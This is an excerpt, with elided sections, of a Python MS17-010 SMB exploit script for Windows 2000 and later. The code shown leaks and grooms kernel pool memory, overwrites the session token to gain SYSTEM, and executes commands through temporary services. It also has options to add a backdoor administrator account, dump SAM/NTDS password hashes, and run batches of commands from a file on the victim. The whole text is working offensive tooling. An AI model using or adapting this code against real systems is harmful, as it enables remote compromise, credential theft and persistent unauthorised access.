...
'''
MS17-010 exploit for Windows 2000 and later by sleepya, modified by chashtag
...
def leak_frag_size(conn, tid, fid):
    ...
    if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
        ...
        logging.info('Target is 64 bit')
        info['arch'] = 'x64'
        info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
    else:
        logging.info('Not found Frag pool tag in leak data')
        sys.exit()
    
    logging.info('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))
    return info
...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
    ...
    if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
        logging.info('No transaction struct in leak data')
        return None
    ...
    logging.info('CONNECTION: 0x{:x}'.format(connection_addr))
    logging.info('SESSION: 0x{:x}'.format(session_addr))
    logging.info('FLINK: 0x{:x}'.format(flink_value))
    logging.info('InParam: 0x{:x}'.format(inparam_value))
    logging.info('MID: 0x{:x}'.format(leak_mid))
    ...
    if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
        logging.info('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
        return None
...
def exploit_matched_pairs(conn, pipe_name, info):
    ...
    logging.info('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
    ...
    logging.info('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
    ...
    for i in range(10):
        ...
        if leakInfo is not None:
            break
        logging.info('leak failed... try again')
        conn.close(tid, fid)
        conn.disconnect_tree(tid)
    ...
    if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
        logging.info('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
        logging.info('!!! Write to wrong place !!!')
        logging.info('the target might be crashed')
        return False

    logging.info('success controlling groom transaction')
    ...
    # ================================
    logging.info('modify trans1 struct for arbitrary read/write')
    fmt = info['PTR_FMT']
...
def exploit_fish_barrel(conn, pipe_name, info):
    ...
    for tinfo in attempt_list:
        logging.info('attempt controlling next transaction on ' + tinfo['ARCH'])
        ...
        if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
            logging.info('success controlling one transaction')
            success = True
            if 'arch' not in info:
                logging.info('Target is '+tinfo['ARCH'])
    ...
    logging.info('modify parameter count to 0xffffffff to be able to write backward')
    ...
    # leak transaction
    # ================================
    logging.info('leak next transaction')
    ...
    if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
        logging.info('chunk size is wrong')
        return False
    ...
    logging.info('SESSION: 0x{:x}'.format(session_addr))
    logging.info('FLINK: 0x{:x}'.format(flink_value))
    logging.info('InData: 0x{:x}'.format(indata_value))
    logging.info('MID: 0x{:x}'.format(trans2_mid))
    
    trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
    trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
    logging.info('TRANS1: 0x{:x}'.format(trans1_addr))
    logging.info('TRANS2: 0x{:x}'.format(trans2_addr))
    
    # ================================
    # modify trans struct to be used for arbitrary read/write
    # ================================
    logging.info('modify transaction struct for arbitrary read/write')
    # modify
    # - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
    # - trans1.InData to &trans2. so we can modify trans2 with trans1 data
...
def exploit(target, pipe_name):
    ...
    logging.info('Target OS: '+server_os)
    if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
        ...
        logging.info('This exploit does not support this target')
        sys.exit()
    
    if pipe_name is None:
        pipe_name = find_named_pipe(conn)
        if pipe_name is None:
            logging.info('Not found accessible named pipe')
            return False
        logging.info('Using named pipe: '+pipe_name)
    ...
    logging.info('make this SMB session to be SYSTEM')
    ...
    if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
        ...
        logging.info('current TOKEN addr: 0x{:x}'.format(tokenAddr))
        ...
        logging.info('overwriting token UserAndGroups')
    ...
    # ================================
    if args.d:
        dusername = ''.join([random.choice(string.letters) for i in range(8)])
        dpassword = ''.join([random.choice(string.letters) for i in range(10)])
        class doptions:
            def __init__(self,):
                self.use_vss = True
                self.remoteName = target
                self.remoteHost = target
                self.target_ip = target
                self.username = dusername
                self.password = dpassword
                self.domain = None
                self.aesKey = None
                self.history = True
                self.outputfile = None
                self.doKerberos = True
                self.pwdLastSet = True
                self.printUserStatus= True
                self.canProcessSAMLSA = False
                self.system = None
                self.bootkey = None
                self.security = None
                self.sam = None
                self.ntds = None
                self.history = True
                self.outputfile = target
                self.k = False
                self.hashes = None
                self.dc_ip= None
                self.just_dc= False
                self.just_dc_ntlm= False
                self.just_dc_user= False
        ...
        service_exec(conn, 'net user {0} {1} /add'.format(dusername,dpassword))
        service_exec(conn, 'net localgroup administrators {0} /add'.format(dusername))
        dumper = DumpSecrets(target, dusername, dpassword,'', options=doptions())
        try:
            dumper.dump()
        except:
            logging.warn('Failed to fetch hases..?')
        service_exec(conn, 'net user {0} /del'.format(dusername))
    ...
    if args.b:
        ...
        logging.info('-'*40)
        logging.info('='*40)
        logging.info('Adding backdoor admin user')
        logging.info('Username: %s' % dusername )
        logging.info('Password: %s' % dpassword )
        logging.info('='*40)
        logging.info('-'*40)
        logging.info('')
        service_exec(conn, 'net user {0} {1} /add'.format(dusername,dpassword))
...
def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset):
    ...
    if RestrictedSidCount != 0 or RestrictedSids != 0 or userAndGroupCount == 0 or userAndGroupsAddr == 0:
        logging.info('Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
        logging.info('RestrictedSids: 0x{:x}'.format(RestrictedSids))
        logging.info('RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))
        success = False

    logging.info('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
    logging.info('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))
...
def get_group_data_from_token(info, tokenData):
    ...
    if not success and info['os'] == 'WINXP' and info['arch'] == 'x86':
        logging.info('Attempting WINXP SP0/SP1 x86 TOKEN_USER_GROUP workaround')
    ...
    if not success:
        logging.info('Bad TOKEN_USER_GROUP offsets. Abort > BSOD')
        sys.exit()
...
def smb_pwn(conn, arch):
    ...
    if os.path.isfile('commands.txt'):
        logging.info('Found commands.txt')
        clines = open('commands.txt').readlines()
        if len(clines)>1:
            for commands in clines:
                service_exec(conn, commands.strip())
        else:
...
def service_exec(conn, cmd):
    ...
    service_name = ''.join([random.choice(string.letters) for i in range(8)])
    ...
    svcHandle = None
    try:
        logging.info("Opening SVCManager on %s....." % conn.get_remote_host())
        ...
        logging.info('Creating service %s for command %s .....' % (service_name,cmd))
        ...
        if serviceHandle:
            ...
            try:
                ...
                #logging.info('Stoping service %s.....' % service_name)
...
parser.add_argument('pipe', help='Pipe to use', nargs='?', default=None)
parser.add_argument('-u', help='Username, Default is \'\'', default='')
